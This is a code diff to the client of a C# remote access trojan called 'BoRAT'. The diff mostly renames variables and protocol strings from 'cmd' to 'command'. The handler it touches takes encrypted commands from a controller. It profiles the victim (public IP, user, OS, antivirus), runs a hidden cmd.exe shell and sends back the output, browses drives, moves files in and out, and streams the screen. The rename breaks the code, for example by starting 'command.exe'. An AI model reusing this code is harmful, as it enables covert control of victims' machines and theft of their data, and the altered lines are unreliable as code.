@@ -259,11 +259,11 @@ namespace BoRAT.Client
         {
             try
             {
-                var cmd = Encoding.Unicode.GetString(data);
-                cmd = Decrypt(cmd);
-                if (cmd.Contains("getInfo"))
+                var command = Encoding.Unicode.GetString(data);
+                command = Decrypt(command);
+                if (command.Contains("getInfo"))
                 {
-                    var id = cmd.Split('~')[1];
+                    var id = command.Split('~')[1];
                     string information, pubIp, userName, osName, avName, timeDate;
                     pubIp = GetPublicIPAddress();
                     userName = GetUserName();
@@ -279,12 +279,12 @@ namespace BoRAT.Client
                     SendCommand(sendInfo);
                 }
 
-                else if (cmd.Equals("startCmd"))
+                else if (command.Equals("startCommand"))
                 {
                     isStarted = true;
 
                     var pInfo = new ProcessStartInfo();
-                    pInfo.FileName = "cmd.exe";
+                    pInfo.FileName = "command.exe";
                     pInfo.CreateNoWindow = true;
                     pInfo.UseShellExecute = false;
                     pInfo.RedirectStandardInput = true;
@@ -299,25 +299,25 @@ namespace BoRAT.Client
                     errorOutput = p.StandardError;
                     writeInput.AutoFlush = true;
 
-                    var cmdShellThread = new Thread(RunCmdShellCommands);
-                    cmdShellThread.Start();
+                    var commandShellThread = new Thread(RunCommandShellCommands);
+                    commandShellThread.Start();
                 }
 
-                else if (cmd.StartsWith("cmd§"))
+                else if (command.StartsWith("command§"))
                 {
                     if (isStarted)
                     {
-                        var strCmd = cmd.Split('§')[1];
-                        writeInput.WriteLine(strCmd + "\r\n");
+                        var strCommand = command.Split('§')[1];
+                        writeInput.WriteLine(strCommand + "\r\n");
                     }
 
                     else
                     {
-                        SendError("cmdFaild\n");
+                        SendError("commandFaild\n");
                     }
                 }
 
-                else if (cmd.Equals("drivesList"))
+                else if (command.Equals("drivesList"))
                 {
                     var dataToSend = "drivesList~";
                     var drivers = DriveInfo.GetDrives();
@@ -344,10 +344,10 @@ namespace BoRAT.Client
                     SendCommand(dataToSend);
                 }
 
-                else if (cmd.StartsWith("enterPath~"))
+                else if (command.StartsWith("enterPath~"))
                 {
                     var checkPath = false;
-                    var path = cmd.Split('~')[1];
+                    var path = command.Split('~')[1];
 
                     if (path.Length == 3 && path.Contains(":\\"))
                     {
@@ -367,9 +367,9 @@ namespace BoRAT.Client
                     enterDir.Start();
                 }
 
-                else if (cmd.StartsWith("backPath~"))
+                else if (command.StartsWith("backPath~"))
                 {
-                    var path = cmd.Split('~')[1];
+                    var path = command.Split('~')[1];
 
                     if (path.Length == 3 && path.Contains(":\\"))
                     {
@@ -382,9 +382,9 @@ namespace BoRAT.Client
                     }
                 }
 
-                else if (cmd.StartsWith("fdl~"))
+                else if (command.StartsWith("fdl~"))
                 {
-                    var info = cmd.Split('~')[1];
+                    var info = command.Split('~')[1];
                     if (File.Exists(info))
                     {
                         fdl_location = info;
@@ -404,7 +404,7 @@ namespace BoRAT.Client
                     }
                 }
 
-                else if (cmd.Equals("fdlConfirm"))
+                else if (command.Equals("fdlConfirm"))
                 {
                     try
                     {
@@ -417,12 +417,12 @@ namespace BoRAT.Client
                     }
                 }
 
-                else if (cmd.StartsWith("fup~"))
+                else if (command.StartsWith("fup~"))
                 {
-                    fup_location = cmd.Split('~')[1];
+                    fup_location = command.Split('~')[1];
                     if (!File.Exists(fup_location))
                     {
-                        fupSize = int.Parse(cmd.Split('~')[2]);
+                        fupSize = int.Parse(command.Split('~')[2]);
                         receivedFile = new byte[fupSize];
                         SendCommand("fupConfirm");
                         isFileUpload = true;
@@ -433,14 +433,14 @@ namespace BoRAT.Client
                     }
                 }
 
-                else if (cmd.Equals("rdpStart"))
+                else if (command.Equals("rdpStart"))
                 {
                     isRdpStop = false;
                     var rdpThread = new Thread(StreamScreen);
                     rdpThread.Start();
                 }
 
-                else if (cmd.Equals("rdpStop"))
+                else if (command.Equals("rdpStop"))
                 {
                     isRdpStop = true;
                 }
@@ -548,7 +548,7 @@ namespace BoRAT.Client
             }
         }
 
-        private void RunCmdShellCommands()
+        private void RunCommandShellCommands()
         {
             try
             {
@@ -561,21 +561,21 @@ namespace BoRAT.Client
                 {
                     strData += tmpData + "\r";
                     //send command
-                    SendCommand("cmdout§" + strData);
+                    SendCommand("commandout§" + strData);
                     strData = "";
                 }
 
                 while ((tmpError = errorOutput.ReadLine()) != null)
                 {
                     strError += tmpError + "\r";
-                    SendCommand("cmdout§" + strError);
+                    SendCommand("commandout§" + strError);
                     strError = "";
                 }
             }
 
             catch (Exception ex)
             {
-                SendError("Cmd Error!\n" + ex.Message + "\n");
+                SendError("Command Error!\n" + ex.Message + "\n");
             }
         }
 
@@ -629,7 +629,7 @@ namespace BoRAT.Client
             }
             catch (PathTooLongException)
             {
-                SendError("Error in EnterPath.\nTry Enter With Cmd Shell\n");
+                SendError("Error in EnterPath.\nTry Enter With Command Shell\n");
             }
             catch (NotSupportedException)
             {
